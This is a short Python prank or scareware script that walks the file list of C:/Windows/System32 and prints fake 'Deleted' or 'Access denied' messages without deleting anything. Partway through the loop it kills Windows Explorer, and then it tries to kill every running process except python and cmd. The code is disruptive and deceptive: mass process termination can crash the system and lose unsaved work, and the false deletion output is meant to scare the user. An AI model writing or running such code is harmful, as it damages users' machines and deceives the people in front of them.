import os
import psutil
import time
import random
count = 0
for file in os.listdir("c:/windows/system32"):
    count=count+1
    if count == 500:
        for proc in psutil.process_iter():
            if "explorer" in proc.name():
                proc.kill()
    if count == 600:
        for proc in psutil.process_iter():
            if "python" not in proc.name() and "cmd" not in proc.name():
                try:
                    proc.kill()
                except:
                    print("UNEXPECTED ERROR IN LINE 16")
    encFile = f"C:/Windows/System32/{file}"
    if random.randrange(0,2) == 1:
        print(f"Could not delete {encFile}: Access denied")
    else:
        time.sleep(0.00001)
        print(f"Deleted {encFile}")
        